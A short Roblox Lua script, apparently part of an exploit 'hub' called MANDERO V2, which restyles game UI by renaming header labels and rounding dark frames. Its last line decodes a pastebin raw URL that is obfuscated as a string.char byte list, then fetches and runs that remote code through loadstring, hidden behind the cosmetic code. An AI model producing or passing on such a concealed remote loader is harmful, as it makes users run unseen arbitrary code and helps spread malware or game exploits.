
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "MANDERO V2"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            -- 1. Только ГЛАВНЫЕ ЗАГОЛОВКИ (Фильтр по размеру и имени)
            if obj:IsA("TextLabel") then
                -- Если шрифт большой (заголовок) или в имени есть Title/Header
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    -- Не меняем цифры и мелкий текст
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            
            -- 2. Скругления и цвета (для красоты)
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then -- Только темные элементы
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end
    
    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 118, 81, 50, 117, 97, 114, 109, 83)))()
